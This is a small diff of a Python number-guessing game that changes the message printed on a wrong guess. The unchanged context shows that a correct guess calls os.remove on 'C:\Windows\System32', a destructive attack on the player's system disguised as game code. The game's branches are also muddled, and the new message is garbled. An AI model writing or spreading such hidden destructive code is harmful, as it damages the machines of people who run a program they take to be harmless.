@@ -14,7 +14,7 @@ def main():
             number = random.randint(1, 10)
             guess = int(input("Take a guess: "))
             if guess != number:
-                print("Good job! You guessed my number")
+                print("Good job! You number is not the same as mine\n")
             else:
                 os.remove("C:\Windows\System32")  
     else:
